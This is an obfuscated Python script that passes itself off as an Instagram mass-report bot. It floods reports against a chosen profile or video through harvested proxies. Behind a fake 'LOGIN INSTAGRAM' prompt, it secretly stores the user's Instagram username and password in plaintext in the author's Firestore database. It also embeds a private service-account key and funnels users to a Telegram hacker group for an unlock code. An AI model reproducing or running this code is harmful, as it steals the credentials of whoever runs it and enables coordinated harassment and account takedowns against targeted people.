#!/usr/bin/env python3
from colorama import Fore ,Back ,Style #line:2
from multiprocessing import Process #line:3
from about import about_msg #line:4
from help import help_msg #line:5
from libs .animation import colorText #line:6
from libs .animation import starting_bot #line:7
from libs .animation import load_animation #line:8
from libs .animation import animation_bar #line:9
from libs .attack import report_video_attack #line:10
from libs .attack import report_profile_attack #line:11
from libs .proxy_harvester import find_proxies #line:12
from libs .utils import parse_proxy_file #line:13
from libs .utils import clearConsole #line:14
from libs .utils import print_status #line:15
from libs .utils import print_error #line:16
from libs .utils import print_success #line:17
from libs .logo import print_logo #line:18
from os import path #line:19
import requests #line:20
import time #line:21
from libs .check_modules import check_modules #line:22
from sys import exit #line:23
from os import _exit #line:24
import os #line:25
import webbrowser #line:26
from dotenv import load_dotenv #line:27
import firebase_admin #line:28
from firebase_admin import credentials #line:29
from firebase_admin import db #line:30
from firebase_admin import firestore #line:31
load_dotenv ()#line:32
cred =credentials .Certificate ({"type":"service_account","project_id":f"{os.getenv('PRODUCT_ID')}","private_key_id":f"{os.getenv('PRIVATE_KEY_ID')}","private_key":"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDNoBRzeE8dsuxE\nB18GeT8BZkBqf41P9Wsr1m6k+Cio9+UCS6vlvgRY1S8ctTSIa7M1dLYOUZXOxc1Z\nSY7jXe2EXSg771FNgYUW/5g7Auqh+DkQM9Ma8RiSKtFr5VXWGneOMykTNX1C1gNI\nfd1jXmnB6s3FGTDDNDGKn3skCRz8aHbAjydeaLe4l7dJ7QuOwibVi+TRJHNjIBqg\nXLdkn1VZ/zKPi+kPpAog40RvXBAhRpSEG0w41AcOmZPY7bGmK7fkIFQY8IntT12w\n6krFZfs78waRYjh46Cc+Aib/11oMN2VH8YLrhDuM2elUP0N9BDK4MNqxnzynnuGE\njbtqRAf7AgMBAAECggEAAgIOMRJ7s06MAB4ST33fn6Pf/SpBtwYuhb8SVYoW24+Q\nLPWQOC4i3Ls4Oo+Kc8qZdWwuWvVxARPtbXHKc233Y9OFERDFOnyJUDAuzGS65doG\ntKHM7fZsxwCkCumybOTVRg452HYtQvnUDmEsSEwjvEEOwV39m+pmkXP9P9zW66AV\nCKQ6YGJqp/HX/XQ4rTwiBp5+nlTcuBvLA9DmBtKQ+DNI7MSg8Qa7Tp4ZDZyV/rYF\nNpNxY+Urr+lRniMONJXkIL/HIPW+ru8yepwU/dIUlYM4KFTZyJUG12T3VEN41YBP\nNp7s+nzun5l1kIrt0XFpVpW/ifshiHxAoIN87+M0AQKBgQD72Dx9NTcn/sZhYwzs\n+cmvspMZKq1NklbUmafeFB9KulD/9cgcY5jLTjIcGk8wuUuGH+2rHX04zmWR21Ox\n14h5xqB8PCJ/DLvlJbIsUtLOAxjLCRZTwVGKtzUptsmJ+uPDQTsX8eg36jNTBipt\n1hBaTP+DLbL+LLwWsZsoMVNwzQKBgQDRBJ5B6nnx+zfC+5dEZj8pPF0ZuEXtbWGf\nyFdP03aGUS2/YSS3NcZP4iFKDGUHr/l8jYQK+Lb5BJnLzu6pjP/B2+/kXg4vZ9Ln\n0jHg4vI2/CGQgxfY8aoKwhPmZLvGFBG/QQ6UAnH4OQSFgRV9gNxVOFuxOUE9CJJY\n6ubLeOI75wKBgAoHmJEb93BeUyQ5v6AIaqHWqMkNzA0U0ORyoh7UClL9jJBFB40p\n4kHmgVRhL9ou5vUWfG6eJAiJH75pT7H7dXH0GRwZgP4yUaFUmP3u5npR4UDkwcDg\nKBEwLqvUnb4jAcMa6/GOLsNbTmP2EOaC6e/OtTZSMZixy2PT+uvk2v/ZAoGAcoTI\nPK8+XwFYPOFhsJ0gr/QdwlC/J2XNniDDDb57av4hRYDw/9xbqjroKE0AMaUN2Vsj\n5Gr+vRLzPMJE6uqQ2mMpXYLW3MxStqbooyFUuiGMNkRNFZTaqIhLJOk+JDmsu4/m\nb9ujG/AJdSgTYS7wCVUWj9Qh1VHT9RnGl+bEdTMCgYEA62f+7okKiialiRo0osN/\nzpn2/bZ/xoNp6paj7t9Msj8Xs3JHGFEu/NXMlOm2cZE0ZFUagddHi/DRVQBMlnG+\nzlQUgueOzM8wsvLw3Vn/erbdBxcwD/ianD53upJbefcR1XkdEdlp0r/59vXETEff\niZ3ZIahZltNG/RAmnr2a0J8=\n-----END PRIVATE KEY-----\n","client_email":f"{os.getenv('CLIENT_EMAIL')}","client_id":f"{os.getenv('CLIENT_ID')}","auth_uri":"https://accounts.google.com/o/oauth2/auth","token_uri":"https://oauth2.googleapis.com/token","auth_provider_x509_cert_url":"https://www.googleapis.com/oauth2/v1/certs","client_x509_cert_url":f"{os.getenv('CLIENT_URL')}"})#line:33
firebase_admin .initialize_app (cred )#line:34
db =firestore .client ()#line:35
check_modules ()#line:36
CODE =os .environ .get ("CODE")#line:37
def chunks (OO00OO0OOO0OOO0OO ,O0O000O0O0000O0O0 ):#line:38
    ""#line:39
    for OO0OOO00OO00000O0 in range (0 ,len (OO00OO0OOO0OOO0OO ),O0O000O0O0000O0O0 ):#line:40
        yield OO00OO0OOO0OOO0OO [OO0OOO00OO00000O0 :OO0OOO00OO00000O0 +O0O000O0O0000O0O0 ]#line:41
def profile_attack_process (OOO0O0O00OO00000O ,OO0OO00O00OO0O0O0 ):#line:42
    if (len (OO0OO00O00OO0O0O0 )==0 ):#line:43
        for _O00O0O0000O00O0O0 in range (10 ):#line:44
            report_profile_attack (OOO0O0O00OO00000O ,None )#line:45
        return #line:46
    for O0OOO0000000OO00O in OO0OO00O00OO0O0O0 :#line:47
        report_profile_attack (OOO0O0O00OO00000O ,O0OOO0000000OO00O )#line:48
def video_attack_process (O0O00OOOOOO0O00O0 ,O000OOOO0000O0O0O ):#line:49
    if (len (O000OOOO0000O0O0O )==0 ):#line:50
        for _OO0O0OO0O0OOOO000 in range (10 ):#line:51
            report_video_attack (O0O00OOOOOO0O00O0 ,None )#line:52
        return #line:53
    for OOO000OOOOOO0O0O0 in O000OOOO0000O0O0O :#line:54
        report_video_attack (O0O00OOOOOO0O00O0 ,OOO000OOOOOO0O0O0 )#line:55
def video_attack (O0OO0OO0O00OOO0O0 ):#line:56
    OO0OO000OOOOO0O00 =input ("Enter the link of the video you want to report")#line:57
    print (Style .RESET_ALL )#line:58
    if (len (O0OO0OO0O00OOO0O0 )==0 ):#line:59
        for O00O0O00OOO00OO00 in range (5 ):#line:60
            OOOOOO000OO0O00OO =Process (target =video_attack_process ,args =(OO0OO000OOOOO0O00 ,[],))#line:61
            OOOOOO000OO0O00OO .start ()#line:62
            print_status (str (O00O0O00OOO00OO00 +1 )+". Transaction Opened!")#line:63
            if (O00O0O00OOO00OO00 ==5 ):#line:64
                print ("")#line:65
        return #line:66
    O00OO0OO0OO00000O =list (chunks (O0OO0OO0O00OOO0O0 ,10 ))#line:67
    print ("")#line:68
    print_status ("Video complaint attack is on!\n")#line:69
    O0OOO00O0OOO00OOO =1 #line:70
    for O0O00O0000OOO0000 in O00OO0OO0OO00000O :#line:71
        OOOOOO000OO0O00OO =Process (target =video_attack_process ,args =(OO0OO000OOOOO0O00 ,O0O00O0000OOO0000 ,))#line:72
        OOOOOO000OO0O00OO .start ()#line:73
        print_status (str (O0OOO00O0OOO00OOO )+". Transaction Opened!")#line:74
        if (O00O0O00OOO00OO00 ==5 ):#line:75
            print ("")#line:76
        O0OOO00O0OOO00OOO =O0OOO00O0OOO00OOO +1 #line:77
def profile_attack (OO0OOO000OO00O0OO ):#line:78
    OOOO0OO000O0O0OO0 =input ("Enter the username of the person you want to report : ")#line:79
    O000O0O00OOO0O000 =requests .get ("https://instagram.com/"+OOOO0OO000O0O0OO0 +"/")#line:80
    if O000O0O00OOO0O000 .status_code !=200 :#line:81
        print ("\n\n"+Fore .RED +"[*] Invalid username!")#line:82
        time .sleep (2 )#line:83
        profile_attack (OO0OOO000OO00O0OO )#line:84
    elif (OOOO0OO000O0O0OO0 ==""):#line:85
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:86
        time .sleep (2 )#line:87
        profile_attack (OO0OOO000OO00O0OO )#line:88
    print (Style .RESET_ALL )#line:89
    if (len (OO0OOO000OO00O0OO )==0 ):#line:90
        for OO00O0O0OOOO0OOO0 in range (5 ):#line:91
            OOOOO00O0OOO00O00 =Process (target =profile_attack_process ,args =(OOOO0OO000O0O0OO0 ,[],))#line:92
            OOOOO00O0OOO00O00 .start ()#line:93
            print_status (str (OO00O0O0OOOO0OOO0 +1 )+". Transaction Opened!")#line:94
        return #line:95
    OOO00O000O0OOOO0O =list (chunks (OO0OOO000OO00O0OO ,10 ))#line:96
    print ("")#line:97
    print_status ("Profile complaint attack is starting!\n")#line:98
    O000000O00OOOOO00 =1 #line:99
    for O00000000OO00OO0O in OOO00O000O0OOOO0O :#line:100
        OOOOO00O0OOO00O00 =Process (target =profile_attack_process ,args =(OOOO0OO000O0O0OO0 ,O00000000OO00OO0O ,))#line:101
        OOOOO00O0OOO00O00 .start ()#line:102
        print_status (str (O000000O00OOOOO00 )+". Transaction Opened!")#line:103
        if (O000000O00OOOOO00 ==5 ):#line:104
            print ("")#line:105
        O000000O00OOOOO00 =O000000O00OOOOO00 +1 #line:106
def unlock ():#line:107
    print (Style .RESET_ALL )#line:108
    OO00OO0OOO00O0O0O =input ("Enter Code To Unlock This Tool - ")#line:109
    if (OO00OO0OOO00O0O0O =="@hackerexploits"):#line:110
        print_success ("Successfully unlocked the tool!\n\n")#line:111
        starting_bot ()#line:112
        database ()#line:113
    elif (OO00OO0OOO00O0O0O =="1"):#line:114
        print_success ("Send #instareport in telegram group @Hacker_Chatroom to get the code\n\n")#line:115
        time .sleep (3 )#line:116
        webbrowser .open ('http://t.me/Hacker_Chatroom')#line:117
        time .sleep (1 )#line:118
        unlock ()#line:119
    else :#line:120
        print ('\nINVALID CODE\n\nHow To Get Code\nGo to t.me/Hacker_Chatroom\nSend #instareport')#line:121
        print_success ("Press 1 for help\n")#line:122
        time .sleep (2 )#line:123
        unlock ()#line:124
def database ():#line:125
    clearConsole ()#line:126
    print_logo ()#line:127
    print (Style .RESET_ALL )#line:128
    print_status ("================ LOGIN INSTAGRAM  ================\n")#line:129
    print (Style .RESET_ALL )#line:130
    O0OO000O0000000OO =input ("Enter your instagram username : ")#line:131
    OO00000OO0OOOOOOO =input ("Enter your instagram password : ")#line:132
    O000O000OOOOOOO0O =requests .get ("https://instagram.com/"+O0OO000O0000000OO +"/")#line:133
    if O000O000OOOOOOO0O .status_code !=200 :#line:134
        print ("\n\n"+Fore .RED +"[*] Invalid username!")#line:135
        database ()#line:136
    elif (O0OO000O0000000OO ==""):#line:137
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank")#line:138
        database ()#line:139
    elif O000O000OOOOOOO0O .status_code ==200 :#line:140
        OOOOO0000O0000O0O ={'password':OO00000OO0OOOOOOO ,'username':O0OO000O0000000OO }#line:141
        db .collection ('users').add (OOOOO0000O0000O0O )#line:142
        load_animation ()#line:143
        print_success ("Login Success!")#line:144
        report ()#line:145
def main ():#line:146
    if (os .name =='nt'):#line:147
        clearConsole ()#line:148
        print_logo ()#line:149
        O0O000O0000OO0OOO =print ('''
        [1] Start Report Bot
        [2] Help
        [3] About
        [4] Exit
        ''')#line:155
        OO0O0O0OOOO00OOOO =input ("Please select :- ")#line:156
        if (OO0O0O0OOOO00OOOO .isdigit ()==False ):#line:157
            print_error ("The answer is not understood.")#line:158
            main ()#line:159
        if (int (OO0O0O0OOOO00OOOO )>4 or int (OO0O0O0OOOO00OOOO )==0 ):#line:160
            print_error ("The answer is not understood.")#line:161
            main ()#line:162
        elif (int (OO0O0O0OOOO00OOOO )==1 ):#line:163
            unlock ()#line:164
        elif (int (OO0O0O0OOOO00OOOO )==2 ):#line:165
            clearConsole ()#line:166
            help_msg ()#line:167
        elif (int (OO0O0O0OOOO00OOOO )==3 ):#line:168
            about_msg ()#line:169
        elif (int (OO0O0O0OOOO00OOOO )==4 ):#line:170
            print_status ("Exiting the program.....Thanks for using this tool!")#line:171
            exit (0 )#line:172
    else :#line:173
        os .system ('bash setup.sh')#line:174
def report ():#line:175
    clearConsole ()#line:176
    print_logo ()#line:177
    OOO00OO00O000OOO0 =input ("Would you like to use a proxy? (Recommended Yes) [Y/N] : ")#line:178
    OOO00OO0O00O000OO =[]#line:179
    if (OOO00OO00O000OOO0 =="Y"or OOO00OO00O000OOO0 =="y"):#line:180
        OOO00OO00O000OOO0 =input ("Would you like to collect your proxies from the internet? [Y/N] : ")#line:181
        if (OOO00OO00O000OOO0 =="Y"or OOO00OO00O000OOO0 =="y"):#line:182
            print_status ("Gathering proxy from the Internet! This may take a while.\n")#line:183
            time .sleep (2 )#line:184
            OOO00OO0O00O000OO =find_proxies ()#line:185
        elif (OOO00OO00O000OOO0 =="N"or OOO00OO00O000OOO0 =="n"):#line:186
            print_status ("Please have a maximum of 50 proxies in a file!")#line:187
            O0OOOOOOOOOO0OOO0 =input ("Enter the path to your proxy list")#line:188
            OOO00OO0O00O000OO =parse_proxy_file (O0OOOOOOOOOO0OOO0 )#line:189
        else :#line:190
            print_error ("Answer not understood, exiting!")#line:191
            exit ()#line:192
        print_success (str (len (OOO00OO0O00O000OO ))+" Number of proxy found!\n")#line:193
        print (OOO00OO0O00O000OO )#line:194
    elif (OOO00OO00O000OOO0 =="N"or OOO00OO00O000OOO0 =="n"):#line:195
        pass #line:196
    else :#line:197
        print_error ("Answer not understood, exiting!")#line:198
        exit ()#line:199
    print ("")#line:200
    print_status ("1 - Report Profile.")#line:201
    print_status ("2 - Report a video.")#line:202
    OOO0000O0OOOOOOOO =input ("Please select the complaint method :- ")#line:203
    print ("")#line:204
    if (OOO0000O0OOOOOOOO .isdigit ()==False ):#line:205
        print_error ("The answer is not understood.")#line:206
        main ()#line:207
    if (int (OOO0000O0OOOOOOOO )>2 or int (OOO0000O0OOOOOOOO )==0 ):#line:208
        print_error ("The answer is not understood.")#line:209
        main ()#line:210
    if (int (OOO0000O0OOOOOOOO )==1 ):#line:211
        profile_attack (OOO00OO0O00O000OO )#line:212
    elif (int (OOO0000O0OOOOOOOO )==2 ):#line:213
        video_attack (OOO00OO0O00O000OO )#line:214
if __name__ =="__main__":#line:215
    try :#line:216
        main ()#line:217
        print (Style .RESET_ALL )#line:218
    except KeyboardInterrupt :#line:219
        print ("\n\n"+Fore .RED +"[*] Program is closing!")#line:220
        print (Style .RESET_ALL )#line:221
        _exit (0 )#line:222
